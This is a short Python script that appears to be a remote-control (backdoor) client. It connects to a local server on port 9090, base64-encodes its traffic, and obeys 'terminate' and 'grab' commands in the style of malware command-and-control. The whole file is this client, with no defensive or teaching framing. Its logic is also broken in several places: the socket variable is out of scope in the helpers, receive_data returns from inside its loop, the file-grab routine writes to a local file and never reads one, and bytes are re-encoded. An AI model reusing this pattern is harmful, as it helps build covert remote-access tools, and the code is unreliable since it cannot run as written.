import socket, os, base64

def connect_to_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(('127.0.0.1', 9090))
        send_data('Connected.')
        while True:
            command = receive_data()
            if 'terminate' in command.decode():
                send_data('Terminating...')
                break
            elif 'grab' in command.decode():
                grab_file(command[5:])
    except Exception as e: 
        send_data(str(e))

def send_data(data):
    try:
        s.sendall(base64.b64encode(data.encode()))
    except:
        pass

def receive_data():
    data = b''
    while True:
        try:
            chunk = s.recv(1024)
            if not chunk: 
                break
            else:
                data += chunk
        except:
            pass
        return base64.b64decode(data)

def grab_file(command):
    with open('grabbed_data.txt', 'wb') as f:
        f.write(receive_data())
    send_data(b'File grabbed.')

if __name__ == '__main__':
    connect_to_server()
